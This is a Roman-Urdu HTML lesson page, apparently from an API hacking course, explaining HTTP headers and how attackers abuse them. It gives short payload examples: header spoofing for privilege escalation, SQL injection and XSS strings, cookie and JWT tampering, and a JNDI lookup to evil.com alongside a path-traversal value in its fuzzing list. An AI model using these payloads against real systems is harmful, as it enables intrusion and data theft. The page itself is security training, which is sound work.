@@ -1,0 +1,990 @@
+<!DOCTYPE html>
+<html lang="ur" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Headers Ki Ahmiyat - HTTP Protocol</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 20px;
+            line-height: 1.8;
+            direction: ltr;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            color: white;
+            padding: 40px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
+        }
+
+        .header p {
+            font-size: 1.2em;
+            margin-top: 10px;
+        }
+
+        .breadcrumb {
+            background: #f8f9fa;
+            padding: 15px 40px;
+            border-bottom: 3px solid #4facfe;
+        }
+
+        .breadcrumb p {
+            color: #666;
+            font-size: 0.95em;
+        }
+
+        .breadcrumb span {
+            color: #4facfe;
+            font-weight: bold;
+        }
+
+        .content {
+            padding: 40px;
+        }
+
+        .intro {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px;
+            border-radius: 15px;
+            margin-bottom: 30px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .intro p {
+            font-size: 1.1em;
+            line-height: 1.8;
+            margin-bottom: 10px;
+        }
+
+        .section {
+            margin-bottom: 40px;
+        }
+
+        .section h2 {
+            color: #4facfe;
+            font-size: 1.8em;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 3px solid #00f2fe;
+            display: inline-block;
+        }
+
+        .section h3 {
+            color: #764ba2;
+            font-size: 1.4em;
+            margin: 25px 0 15px 0;
+            padding-left: 15px;
+            border-left: 4px solid #4facfe;
+        }
+
+        .section p {
+            color: #333;
+            margin-bottom: 15px;
+            text-align: justify;
+        }
+
+        .definition-box {
+            background: linear-gradient(135deg, #a8edea 0%, #fed6e3 100%);
+            border-left: 8px solid #4facfe;
+            padding: 30px;
+            margin: 30px 0;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .definition-box h3 {
+            color: #4facfe;
+            font-size: 1.6em;
+            margin: 0 0 15px 0;
+            padding: 0;
+            border: none;
+        }
+
+        .definition-box p {
+            font-size: 1.1em;
+            color: #2c3e50;
+            line-height: 1.9;
+        }
+
+        .headers-comparison {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            margin: 30px 0;
+        }
+
+        .request-headers, .response-headers {
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+        }
+
+        .request-headers {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+
+        .response-headers {
+            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
+            color: white;
+        }
+
+        .request-headers h3, .response-headers h3 {
+            font-size: 2em;
+            margin: 0 0 20px 0;
+            padding: 0;
+            border: none;
+            color: white;
+        }
+
+        .header-item {
+            background: rgba(255, 255, 255, 0.15);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 10px 0;
+            backdrop-filter: blur(10px);
+        }
+
+        .header-item .header-name {
+            font-weight: bold;
+            font-size: 1.1em;
+            margin-bottom: 5px;
+            font-family: 'Courier New', monospace;
+        }
+
+        .header-item .header-description {
+            font-size: 0.95em;
+            opacity: 0.9;
+        }
+
+        .importance-section {
+            background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);
+            padding: 30px;
+            border-radius: 15px;
+            margin: 30px 0;
+            border-left: 8px solid #c0392b;
+        }
+
+        .importance-section h2 {
+            color: #c0392b;
+            text-align: center;
+            margin: 0 0 25px 0;
+            border: none;
+            display: block;
+        }
+
+        .importance-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+            gap: 20px;
+            margin: 25px 0;
+        }
+
+        .importance-card {
+            background: white;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            border-left: 5px solid;
+        }
+
+        .importance-card.info {
+            border-left-color: #3498db;
+        }
+
+        .importance-card.auth {
+            border-left-color: #e74c3c;
+        }
+
+        .importance-card.access {
+            border-left-color: #f39c12;
+        }
+
+        .importance-card.security {
+            border-left-color: #9b59b6;
+        }
+
+        .importance-card.injection {
+            border-left-color: #e67e22;
+        }
+
+        .importance-card.session {
+            border-left-color: #1abc9c;
+        }
+
+        .importance-card .icon {
+            font-size: 2.5em;
+            margin-bottom: 15px;
+        }
+
+        .importance-card h4 {
+            font-size: 1.4em;
+            margin-bottom: 10px;
+        }
+
+        .importance-card.info h4 {
+            color: #3498db;
+        }
+
+        .importance-card.auth h4 {
+            color: #e74c3c;
+        }
+
+        .importance-card.access h4 {
+            color: #f39c12;
+        }
+
+        .importance-card.security h4 {
+            color: #9b59b6;
+        }
+
+        .importance-card.injection h4 {
+            color: #e67e22;
+        }
+
+        .importance-card.session h4 {
+            color: #1abc9c;
+        }
+
+        .importance-card p {
+            color: #2c3e50;
+            text-align: left;
+            margin-bottom: 10px;
+        }
+
+        .importance-card ul {
+            list-style: none;
+            padding: 0;
+            margin-top: 10px;
+        }
+
+        .importance-card ul li {
+            padding: 8px 0;
+            padding-left: 25px;
+            position: relative;
+            color: #555;
+        }
+
+        .importance-card ul li::before {
+            content: "→";
+            position: absolute;
+            left: 0;
+            font-weight: bold;
+        }
+
+        .importance-card.info ul li::before {
+            color: #3498db;
+        }
+
+        .importance-card.auth ul li::before {
+            color: #e74c3c;
+        }
+
+        .importance-card.access ul li::before {
+            color: #f39c12;
+        }
+
+        .importance-card.security ul li::before {
+            color: #9b59b6;
+        }
+
+        .importance-card.injection ul li::before {
+            color: #e67e22;
+        }
+
+        .importance-card.session ul li::before {
+            color: #1abc9c;
+        }
+
+        .code-example {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 20px;
+            border-radius: 10px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.95em;
+            margin: 15px 0;
+            overflow-x: auto;
+        }
+
+        .code-header {
+            background: #4facfe;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 10px 10px 0 0;
+            font-weight: bold;
+            margin-bottom: -15px;
+        }
+
+        .header-name-code {
+            color: #e67e22;
+        }
+
+        .header-value-code {
+            color: #2ecc71;
+        }
+
+        .practical-section {
+            background: linear-gradient(135deg, #e0c3fc 0%, #8ec5fc 100%);
+            padding: 30px;
+            border-radius: 15px;
+            margin: 30px 0;
+        }
+
+        .practical-section h3 {
+            color: #667eea;
+            text-align: center;
+            margin: 0 0 25px 0;
+            padding: 0;
+            border: none;
+        }
+
+        .practical-card {
+            background: white;
+            padding: 25px;
+            border-radius: 10px;
+            margin: 20px 0;
+            border-left: 5px solid #667eea;
+        }
+
+        .practical-card h4 {
+            color: #667eea;
+            font-size: 1.3em;
+            margin-bottom: 15px;
+        }
+
+        .highlight-box {
+            background: linear-gradient(135deg, #ffecd2 0%, #fcb69f 100%);
+            border-left: 5px solid #4facfe;
+            padding: 25px;
+            margin: 25px 0;
+            border-radius: 10px;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .highlight-box strong {
+            color: #4facfe;
+            font-size: 1.1em;
+        }
+
+        .attack-vector {
+            background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 15px 0;
+            border-left: 5px solid #c0392b;
+        }
+
+        .attack-vector h5 {
+            color: #c0392b;
+            font-size: 1.2em;
+            margin-bottom: 10px;
+        }
+
+        .attack-vector p {
+            color: #2c3e50;
+        }
+
+        .footer {
+            background: #2d3436;
+            color: white;
+            text-align: center;
+            padding: 30px;
+            margin-top: 40px;
+        }
+
+        .footer p {
+            color: #dfe6e9;
+        }
+
+        @media (max-width: 768px) {
+            .header h1 {
+                font-size: 2em;
+            }
+
+            .content {
+                padding: 20px;
+            }
+
+            .section h2 {
+                font-size: 1.5em;
+            }
+
+            .headers-comparison {
+                grid-template-columns: 1fr;
+            }
+
+            .importance-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .visual-flow {
+            display: flex;
+            align-items: center;
+            justify-content: space-around;
+            flex-wrap: wrap;
+            gap: 20px;
+            margin: 30px 0;
+        }
+
+        .flow-box {
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            color: white;
+            padding: 25px;
+            border-radius: 12px;
+            text-align: center;
+            min-width: 200px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .flow-box .icon {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+
+        .flow-box h4 {
+            font-size: 1.2em;
+            margin-bottom: 10px;
+            color: white;
+        }
+
+        .flow-arrow {
+            font-size: 2em;
+            color: #4facfe;
+        }
+
+        ul {
+            margin: 15px 0;
+            padding-left: 40px;
+        }
+
+        ul li {
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .tools-section {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px;
+            border-radius: 15px;
+            margin: 30px 0;
+        }
+
+        .tools-section h3 {
+            color: white;
+            text-align: center;
+            margin: 0 0 25px 0;
+            padding: 0;
+            border: none;
+        }
+
+        .tools-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+        }
+
+        .tool-card {
+            background: rgba(255, 255, 255, 0.15);
+            padding: 20px;
+            border-radius: 10px;
+            backdrop-filter: blur(10px);
+        }
+
+        .tool-card h4 {
+            color: white;
+            font-size: 1.3em;
+            margin-bottom: 10px;
+        }
+
+        .tool-card p {
+            color: #f0f0f0;
+            text-align: left;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>📋 Headers Ki Ahmiyat</h1>
+            <p>The Importance of HTTP Headers</p>
+        </div>
+
+        <div class="breadcrumb">
+            <p><span>API Hacking</span> → <span>Bunyadi Maloomat</span> → <span>HTTP Protocol</span> → Headers Ki Ahmiyat</p>
+        </div>
+
+        <div class="content">
+            <div class="intro">
+                <p>API hacking ke silsile mein, <strong>HTTP headers</strong> ko samajhna bunyadi hai kyunke yeh client aur server ke darmiyan communication mein aik <strong>ahem kirdar</strong> ada karte hain.</p>
+                
+                <p>In mein aksar <strong>qeemti maloomat</strong> ya <strong>control mechanisms</strong> shamil hote hain jinhein exploit kiya ja sakta hai.</p>
+
+                <p>Headers sirf technical details nahin hain; woh API communication ke <strong>active components</strong> hain!</p>
+            </div>
+
+            <div class="section">
+                <h2>📖 HTTP Headers Kya Hain?</h2>
+
+                <div class="definition-box">
+                    <h3>Definition:</h3>
+                    <p>HTTP headers <strong>key-value pairs</strong> hotay hain jo HTTP request ya response ke sath bheje jatay hain.</p>
+                    <br>
+                    <p>Yeh message, bhejney walay, wasool karnay walay, ya khud payload ke baray mein <strong>metadata</strong> faraham karte hain.</p>
+                </div>
+
+                <div class="code-header">Header Format</div>
+                <div class="code-example"><span class="header-name-code">Header-Name</span>: <span class="header-value-code">Header-Value</span>
+
+Example:
+<span class="header-name-code">Content-Type</span>: <span class="header-value-code">application/json</span>
+<span class="header-name-code">Authorization</span>: <span class="header-value-code">Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</span>
+<span class="header-name-code">User-Agent</span>: <span class="header-value-code">Mozilla/5.0 (Windows NT 10.0; Win64; x64)</span></div>
+            </div>
+
+            <div class="section">
+                <h2>🔄 Request Headers vs Response Headers</h2>
+
+                <div class="headers-comparison">
+                    <!-- Request Headers -->
+                    <div class="request-headers">
+                        <h3>📤 Request Headers</h3>
+                        <p style="margin-bottom: 20px;">Client se server ko bheje jane wale headers:</p>
+
+                        <div class="header-item">
+                            <div class="header-name">Content-Type</div>
+                            <div class="header-description">Client kis qism ka content bhej raha hai</div>
+                            <div class="code-example" style="margin-top: 10px;">Content-Type: application/json</div>
+                        </div>
+
+                        <div class="header-item">
+                            <div class="header-name">Accept</div>
+                            <div class="header-description">Client kis qism ka content pasand karta hai</div>
+                            <div class="code-example" style="margin-top: 10px;">Accept: application/xml</div>
+                        </div>
+
+                        <div class="header-item">
+                            <div class="header-name">Authorization</div>
+                            <div class="header-description">Authentication credentials</div>
+                            <div class="code-example" style="margin-top: 10px;">Authorization: Bearer token123</div>
+                        </div>
+
+                        <div class="header-item">
+                            <div class="header-name">User-Agent</div>
+                            <div class="header-description">Client ke browser/OS ki maloomat</div>
+                            <div class="code-example" style="margin-top: 10px;">User-Agent: Chrome/96.0.4664.110</div>
+                        </div>
+
+                        <div class="header-item">
+                            <div class="header-name">Host</div>
+                            <div class="header-description">Server ka address</div>
+                            <div class="code-example" style="margin-top: 10px;">Host: api.example.com</div>
+                        </div>
+
+                        <div class="header-item">
+                            <div class="header-name">Cookie</div>
+                            <div class="header-description">Stored cookies bhejni hain</div>
+                            <div class="code-example" style="margin-top: 10px;">Cookie: sessionid=abc123</div>
+                        </div>
+                    </div>
+
+                    <!-- Response Headers -->
+                    <div class="response-headers">
+                        <h3>📥 Response Headers</h3>
+                        <p style="margin-bottom: 20px;">Server se client ko bheje jane wale headers:</p>
+
+                        <div class="header-item">
+                            <div class="header-name">Content-Type</div>
+                            <div class="header-description">Server kis qism ka content bhej raha hai</div>
+                            <div class="code-example" style="margin-top: 10px;">Content-Type: application/json</div>
+                        </div>
+
+                        <div class="header-item">
+                            <div class="header-name">Cache-Control</div>
+                            <div class="header-description">Response ko kaise cache karna hai</div>
+                            <div class="code-example" style="margin-top: 10px;">Cache-Control: no-cache, no-store</div>
+                        </div>
+
+                        <div class="header-item">
+                            <div class="header-name">Set-Cookie</div>
+                            <div class="header-description">Client ko cookies set karne ke instructions</div>
+                            <div class="code-example" style="margin-top: 10px;">Set-Cookie: sessionid=xyz; HttpOnly</div>
+                        </div>
+
+                        <div class="header-item">
+                            <div class="header-name">Server</div>
+                            <div class="header-description">Server ki tafseelat</div>
+                            <div class="code-example" style="margin-top: 10px;">Server: nginx/1.18.0</div>
+                        </div>
+
+                        <div class="header-item">
+                            <div class="header-name">Location</div>
+                            <div class="header-description">Redirect ka location</div>
+                            <div class="code-example" style="margin-top: 10px;">Location: /newpath</div>
+                        </div>
+
+                        <div class="header-item">
+                            <div class="header-name">Content-Security-Policy</div>
+                            <div class="header-description">Security policies</div>
+                            <div class="code-example" style="margin-top: 10px;">CSP: default-src 'self'</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2>🎯 Headers API Hacking Ke Liye Kyun Ahem Hain?</h2>
+
+                <div class="importance-section">
+                    <h2>6 Aham Wajuhat</h2>
+                    <p style="text-align: center; color: #2c3e50; font-size: 1.1em; margin-bottom: 25px;">Aik API hacker ke liye, headers <strong>maloomat ka khazana</strong> aur aik <strong>common attack vector</strong> hotay hain:</p>
+
+                    <div class="importance-grid">
+                        <!-- 1. Information Disclosure -->
+                        <div class="importance-card info">
+                            <div class="icon">📢</div>
+                            <h4>1. Maloomat Zahir Karna</h4>
+                            <p>Server headers sensitive information expose kar sakte hain:</p>
+
+                            <div class="attack-vector">
+                                <h5>Server Maloomat:</h5>
+                                <p><code>Server</code> header web server ki qism aur version zahir karta hai, jis mein maloom vulnerabilities ho sakti hain.</p>
+                                <div class="code-example">Server: Apache/2.4.41 (Ubuntu)
+X-Powered-By: PHP/7.4.3</div>
+                            </div>
+
+                            <div class="attack-vector">
+                                <h5>Technology Stack:</h5>
+                                <p><code>X-Powered-By</code> headers programming language ya framework ko be-naqab kar sakte hain.</p>
+                                <div class="code-example">X-Powered-By: Express
+X-AspNet-Version: 4.0.30319</div>
+                            </div>
+
+                            <div class="attack-vector">
+                                <h5>Debug Maloomat:</h5>
+                                <p><code>X-Debug</code> headers galti se internal error messages zahir kar sakte hain.</p>
+                                <div class="code-example">X-Debug-Token: abc123
+X-Debug-Error: SQL syntax error at line 42</div>
+                            </div>
+                        </div>
+
+                        <!-- 2. Authentication & Authorization -->
+                        <div class="importance-card auth">
+                            <div class="icon">🔐</div>
+                            <h4>2. Authentication aur Authorization</h4>
+                            <p>Headers mein credentials ka exchange hota hai:</p>
+
+                            <div class="attack-vector">
+                                <h5>Authentication Tokens:</h5>
+                                <p><code>Authorization</code> header mein API keys, JWT tokens, ya session tokens hotay hain.</p>
+                                <div class="code-example">Authorization: Bearer eyJhbGc...
+Authorization: Basic dXNlcjpwYXNz</div>
+                                <p style="margin-top: 10px; color: #c0392b;"><strong>Attack:</strong> Token manipulation, session hijacking</p>
+                            </div>
+
+                            <div class="attack-vector">
+                                <h5>API Keys:</h5>
+                                <p>Custom headers mein API keys pass kiye jatay hain.</p>
+                                <div class="code-example">X-API-Key: sk_live_51234567890
+Api-Token: abc-def-ghi-jkl</div>
+                                <p style="margin-top: 10px; color: #c0392b;"><strong>Attack:</strong> Key compromise se unauthorized access</p>
+                            </div>
+                        </div>
+
+                        <!-- 3. Access Control Bypass -->
+                        <div class="importance-card access">
+                            <div class="icon">🚪</div>
+                            <h4>3. Access Control Bypass</h4>
+                            <p>Headers ko modify kar ke privileges barhayi ja sakti hain:</p>
+
+                            <div class="attack-vector">
+                                <h5>Privilege Escalation:</h5>
+                                <p>Custom headers se admin access mil sakta hai.</p>
+                                <div class="code-example">X-Admin: true
+X-User-Role: administrator
+X-Forwarded-For: 127.0.0.1</div>
+                                <p style="margin-top: 10px; color: #c0392b;"><strong>Attack:</strong> Header injection se unchi privileges</p>
+                            </div>
+
+                            <div class="attack-vector">
+                                <h5>IDOR via Headers:</h5>
+                                <p>Object IDs custom headers mein pass ho sakte hain.</p>
+                                <div class="code-example">X-User-ID: 123
+X-Account-ID: admin-account</div>
+                                <p style="margin-top: 10px; color: #c0392b;"><strong>Attack:</strong> ID manipulation se IDOR</p>
+                            </div>
+                        </div>
+
+                        <!-- 4. Security Mechanism Bypass -->
+                        <div class="importance-card security">
+                            <div class="icon">🛡️</div>
+                            <h4>4. Security Mechanism Bypass</h4>
+                            <p>Security checks ko headers ke through bypass kiya ja sakta hai:</p>
+
+                            <div class="attack-vector">
+                                <h5>Rate Limiting Bypass:</h5>
+                                <p>IP addresses ko spoof kar ke rate limiting se bach sakte hain.</p>
+                                <div class="code-example">X-Forwarded-For: 1.2.3.4
+X-Real-IP: 5.6.7.8
+User-Agent: BotScanner/1.0</div>
+                                <p style="margin-top: 10px; color: #c0392b;"><strong>Attack:</strong> Headers rotate kar ke limits bypass</p>
+                            </div>
+
+                            <div class="attack-vector">
+                                <h5>Origin/Referer Bypass:</h5>
+                                <p>Security checks ko spoof kar sakte hain.</p>
+                                <div class="code-example">Origin: https://trusted-site.com
+Referer: https://admin.example.com</div>
+                                <p style="margin-top: 10px; color: #c0392b;"><strong>Attack:</strong> CSRF aur access control bypass</p>
+                            </div>
+                        </div>
+
+                        <!-- 5. Injection Attacks -->
+                        <div class="importance-card injection">
+                            <div class="icon">💉</div>
+                            <h4>5. Injection Attacks</h4>
+                            <p>Headers mein malicious data inject kiya ja sakta hai:</p>
+
+                            <div class="attack-vector">
+                                <h5>SQL Injection:</h5>
+                                <p>User-Agent ya custom headers mein SQL inject kar sakte hain.</p>
+                                <div class="code-example">User-Agent: ' OR '1'='1
+X-Search-Query: admin' --</div>
+                                <p style="margin-top: 10px; color: #c0392b;"><strong>Attack:</strong> Database compromise</p>
+                            </div>
+
+                            <div class="attack-vector">
+                                <h5>XSS via Headers:</h5>
+                                <p>Headers jo response mein reflect hote hain.</p>
+                                <div class="code-example">User-Agent: &lt;script&gt;alert(1)&lt;/script&gt;
+X-Custom-Header: &lt;img src=x onerror=alert(1)&gt;</div>
+                                <p style="margin-top: 10px; color: #c0392b;"><strong>Attack:</strong> Cross-Site Scripting</p>
+                            </div>
+                        </div>
+
+                        <!-- 6. Session Management -->
+                        <div class="importance-card session">
+                            <div class="icon">🍪</div>
+                            <h4>6. Session Management</h4>
+                            <p>Cookies aur sessions headers ke through manage hote hain:</p>
+
+                            <div class="attack-vector">
+                                <h5>Cookie Manipulation:</h5>
+                                <p>Session cookies ko modify kar sakte hain.</p>
+                                <div class="code-example">Cookie: sessionid=abc123; role=user
+
+Modified:
+Cookie: sessionid=abc123; role=admin</div>
+                                <p style="margin-top: 10px; color: #c0392b;"><strong>Attack:</strong> Session hijacking, fixation</p>
+                            </div>
+
+                            <div class="attack-vector">
+                                <h5>JWT Token Manipulation:</h5>
+                                <p>JSON Web Tokens ko tamper kar sakte hain.</p>
+                                <div class="code-example">Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0...</div>
+                                <p style="margin-top: 10px; color: #c0392b;"><strong>Attack:</strong> Algorithm confusion, signature bypass</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2>🛠️ Hacking Ke Liye Amali Asarat</h2>
+
+                <div class="practical-section">
+                    <h3>Practical Implications</h3>
+
+                    <div class="practical-card">
+                        <h4>🔍 1. Interception aur Modification</h4>
+                        <p><strong>Burp Suite</strong> jaise tools API hacking ke liye zaroori hain:</p>
+                        <ul>
+                            <li>HTTP requests aur responses ko <strong>intercept</strong> karna</li>
+                            <li>Tamam headers ko <strong>dekhna</strong></li>
+                            <li>Headers ko server/client ko bhejne se pehle <strong>modify</strong> karna</li>
+                            <li>Automated attacks ke liye headers ko <strong>fuzz</strong> karna</li>
+                        </ul>
+                        <div class="code-example">Burp Suite → Proxy → Intercept
+→ Modify headers in real-time
+→ Test different header values
+→ Observe server responses</div>
+                    </div>
+
+                    <div class="practical-card">
+                        <h4>🎲 2. Fuzzing</h4>
+                        <p>Headers ko <strong>fuzz</strong> kiya ja sakta hai:</p>
+                        <ul>
+                            <li>Ghair-mutawaqqe values bhejna</li>
+                            <li>Ghalat qism ki values test karna</li>
+                            <li>Posheeda vulnerabilities talaash karna</li>
+                            <li>Ghair-mutawaqqe server behavior dekhna</li>
+                        </ul>
+                        <div class="code-example">Fuzzing Examples:
+User-Agent: ${jndi:ldap://evil.com/a}
+X-Forwarded-For: ../../../../etc/passwd
+Content-Length: -1
+Authorization: Bearer null</div>
+                    </div>
+
+                    <div class="practical-card">
+                        <h4>📊 3. Enumeration</h4>
+                        <p>Requests aur responses dono mein headers ka muaina:</p>
+                        <ul>
+                            <li>API ke <strong>architecture</strong> ke baray mein clues</li>
+                            <li>Istemal hone wale <strong>technologies</strong> ki pehchan</li>
+                            <li>Mumkina <strong>kamzoriyon</strong> ki nishandahi</li>
+                            <li>Security controls ka <strong>analysis</strong></li>
+                        </ul>
+                        <div class="code-example">Analysis Points:
+→ Server: nginx → Check for nginx CVEs
+→ X-Powered-By: Express → Node.js backend
+→ Set-Cookie: HttpOnly missing → Cookie theft possible
+→ No CORS headers → Potential for attacks</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2>🔧 Common Tools for Header Analysis</h2>
+
+                <div class="tools-section">
+                    <h3>Essential Tools</h3>
+                    <div class="tools-grid">
+                        <div class="tool-card">
+                            <h4>🔴 Burp Suite</h4>
+                            <p>Professional web security testing tool. Headers ko intercept, modify, aur analyze karne ke liye best.</p>
+                        </div>
+
+                        <div class="tool-card">
+                            <h4>📮 Postman</h4>
+                            <p>API development aur testing platform. Headers ko easily manage aur test kar sakte hain.</p>
+                        </div>
+
+                        <div class="tool-card">
+                            <h4>⚡ OWASP ZAP</h4>
+                            <p>Open-source security scanner. Automated header-based vulnerability detection.</p>
+                        </div>
+
+                        <div class="tool-card">
+                            <h4>🌐 Browser DevTools</h4>
+                            <p>Built-in browser tools. Network tab mein sab headers dekh sakte hain.</p>
+                        </div>
+
+                        <div class="tool-card">
+                            <h4>📡 cURL</h4>
+                            <p>Command-line tool. Custom headers ke saath requests bhejne ke liye.</p>
+                        </div>
+
+                        <div class="tool-card">
+                            <h4>🔍 Wireshark</h4>
+                            <p>Network protocol analyzer. Raw HTTP traffic aur headers capture karta hai.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2>💡 Real-World Attack Examples</h2>
+
+                <div class="visual-flow">
+                    <div class="flow-box">
+                        <div class="icon">🎯</div>
+                        <h4>Attack 1</h4>
+                        <p>X-Forwarded-For spoofing se rate limiting bypass</p>
+                    </div>
+                    <div class="flow-arrow">→</div>
+                    <div class="flow-box">
+                        <div class="icon">🔓</div>
+                        <h4>Attack 2</h4>
+                        <p>Authorization header manipulation se privilege escalation</p>
+                    </div>
+                    <div class="flow-arrow">→</div>
+                    <div class="flow-box">
+                        <div class="icon">💥</div>
+                        <h4>Attack 3</h4>
+                        <p>User-Agent header mein SQL injection</p>
+                    </div>
+                </div>
+
+                <div class="highlight-box">
+                    <p><strong>⚠️ Important:</strong> Yeh attacks sirf <strong>authorized testing</strong> ke dauran aur <strong>legal permission</strong> ke saath hi kiye jane chahiye. Unauthorized hacking <strong>illegal</strong> hai!</p>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2>📝 Mukhtasar</h2>
+
+                <div class="definition-box">
+                    <h3>Key Takeaways:</h3>
+                    <ul style="list-style: none; padding: 0;">
+                        <li style="padding: 8px 0; padding-left: 25px; position: relative;">
+                            <span style="position: absolute; left: 0; color: #4facfe; font-weight: bold;">→</span>
+                            <strong>HTTP Headers</strong> key-value pairs hain jo metadata provide karte hain
+                        </li>
+                        <li style="padding: 8px 0; padding-left: 25px; position: relative;">
+                            <span style="position: absolute; left: 0; color: #4facfe; font-weight: bold;">→</span>
+                            <strong>Request Headers:</strong> Client se server ko information
+                        </li>
+                        <li style="padding: 8px 0; padding-left: 25px; position: relative;">
+                            <span style="position: absolute; left: 0; color: #4facfe; font-weight: bold;">→</span>
+                            <strong>Response Headers:</strong> Server se client ko information
+                        </li>
+                        <li style="padding: 8px 0; padding-left: 25px; position: relative;">
+                            <span style="position: absolute; left: 0; color: #4facfe; font-weight: bold;">→</span>
+                            <strong>6 Ahem Areas:</strong> Information Disclosure, Authentication, Access Control, Security Bypass, Injection, Session Management
+                        </li>
+                        <li style="padding: 8px 0; padding-left: 25px; position: relative;">
+                            <span style="position: absolute; left: 0; color: #4facfe; font-weight: bold;">→</span>
+                            <strong>Attack Vectors:</strong> Headers manipulation, injection, bypass techniques
+                        </li>
+                        <li style="padding: 8px 0; padding-left: 25px; position: relative;">
+                            <span style="position: absolute; left: 0; color: #4facfe; font-weight: bold;">→</span>
+                            <strong>Tools:</strong> Burp Suite, Postman, ZAP, cURL, DevTools
+                        </li>
+                        <li style="padding: 8px 0; padding-left: 25px; position: relative;">
+                            <span style="position: absolute; left: 0; color: #4facfe; font-weight: bold;">→</span>
+                            <strong>Practical Skills:</strong> Interception, Modification, Fuzzing, Enumeration
+                        </li>
+                    </ul>
+                </div>
+
+                <div class="highlight-box">
+                    <p><strong>🎯 Conclusion:</strong> Header analysis mein maharat hasil karna kisi bhi shakhs ke liye <strong>bunyadi skill</strong> hai jo asar-angez API hacking karna chahta hai. Headers sirf technical details nahin hain; woh API communication ke <strong>active components</strong> hain jinhein aik API hacker ko samajhna, ghaur se dekhna, aur aksar manipulate karna chahiye taaki vulnerabilities ko daryaft aur exploit kiya ja sake!</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <p>📚 API Hacking Course - Bunyadi Maloomat</p>
+            <p style="margin-top: 10px; font-size: 0.9em;">Headers Ki Ahmiyat - HTTP Protocol</p>
+        </div>
+    </div>
+</body>
+</html>
